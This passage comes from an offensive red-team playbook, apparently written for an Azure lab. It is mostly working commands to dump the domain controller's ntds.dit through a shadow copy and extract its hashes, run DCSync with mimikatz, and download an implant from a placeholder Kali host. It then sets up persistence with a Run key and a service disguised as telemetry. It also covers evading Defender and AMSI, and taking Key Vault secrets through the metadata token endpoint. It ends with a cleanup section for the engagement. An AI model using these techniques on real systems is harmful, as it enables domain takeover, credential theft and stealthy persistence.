Get-Item C:\Windows\Temp\ntds.zip | Select Name,Length
'@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $ntds
```

```powershell
# Method 2: VSS shadow copy (if ntdsutil blocked)
$vss = @'
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\","ClientAccessible")
$shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select -First 1).DeviceObject
cmd /c copy "${shadowPath}\Windows\NTDS\ntds.dit" C:\Windows\Temp\ntds.dit
cmd /c copy "${shadowPath}\Windows\System32\config\SYSTEM" C:\Windows\Temp\SYSTEM
Compress-Archive -Path C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM -DestinationPath C:\Windows\Temp\ntds.zip -Force
Get-Item C:\Windows\Temp\ntds.zip | Select Name,Length
'@

Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $vss
```

Then download from DC (via lateral move through httpserver or download via RunCommand output):
```bash
# On Kali: extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### 12c: DCSync via Sliver (If You Have a Session on DC)

```
# From Sliver session with DA creds
mimikatz lsadump::dcsync /user:contoso\krbtgt
mimikatz lsadump::dcsync /user:contoso\Administrator
```

### 12d: Persist on DC (Registry Run Key + Service)

```powershell
$dcPersist = @'
# Registry Run key
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagnosticsTrackingService" -Value "C:\ProgramData\Microsoft\Network\DiagTrack.exe" -PropertyType String -Force

# Windows service (runs at boot as SYSTEM)
New-Service -Name "DiagTrack2" -BinaryPathName "C:\ProgramData\Microsoft\Network\DiagTrack.exe" -DisplayName "Diagnostics Tracking Service 2" -StartupType Automatic -Description "Connected User Experiences and Telemetry secondary service"
Start-Service DiagTrack2

# Verify
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Select DiagnosticsTrackingService
Get-Service DiagTrack2
'@

# First drop the implant, then set persistence
$drop = 'iwr http://YOUR_KALI_IP:8080/teams-dc.exe -OutFile C:\ProgramData\Microsoft\Network\DiagTrack.exe -UseBasicParsing'
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $drop

# Then persist
Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDomainServer" `
  -CommandId "RunPowerShellScript" -ScriptString $dcPersist
```

### Persistence Cleanup (End of Engagement)

```powershell
# httpserver
schtasks /delete /tn "\Microsoft\Windows\NetTrace\GatherNetworkInfo" /f
schtasks /delete /tn "\Microsoft\Windows\Maintenance\WinSAT" /f

# DBServer (from evil-winrm)
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*Parity*' } | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -like '*Parity*' } | Remove-WmiObject

# DC
Stop-Service DiagTrack2 -Force; sc.exe delete DiagTrack2
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagnosticsTrackingService" -Force
```

---


---


## Troubleshooting

### Implant blocked by Defender
Tamper Protection is ON — you CANNOT add exclusions or disable Defender.
1. Do NOT use `--evasion` flag — it triggers AMSI
2. Use Harriet wrapping (DirectSyscalls) — AES-encrypted shellcode + direct syscalls bypasses static detection
3. If Harriet gets caught, try different method: `queueapc`, `nativeapi`, `fullaes`
4. If nothing lands, use RunCommand as your C2 channel (Step 4a/4c/4d) — it's not scanned
5. NC reverse shells get flagged as `PUA:PowerShell/ReverseShell` — avoid them, use RunCommand directly

### AMSI / Tamper Protection
Managed Defender with Tamper Protection blocks ALL local changes:
- `Add-MpPreference` — blocked
- Registry edits — overridden
- AMSI provider removal — reverted
**Workaround**: Harriet DirectSyscalls bypasses AMSI. RunCommand scripts are not AMSI-scanned.

### RunCommand queue stuck (max 25 per VM)
```powershell
Get-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" | FT Name, ProvisioningState
Remove-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" -RunCommandName "old-command"
```

### VM Agent Not Ready
```powershell
Restart-AzVM -ResourceGroupName "RGCORPSERVERS" -Name "blueHttpServer"
```

### svc.mssql password differs per environment
Each environment has a DIFFERENT password. Kerberoast in each one. Check KeyVault from inside VNet:
```powershell
$kvt = (Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -Headers @{Metadata='true'}).access_token
(Invoke-RestMethod -Uri "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4" -Headers @{Authorization="Bearer $kvt"}).value
```
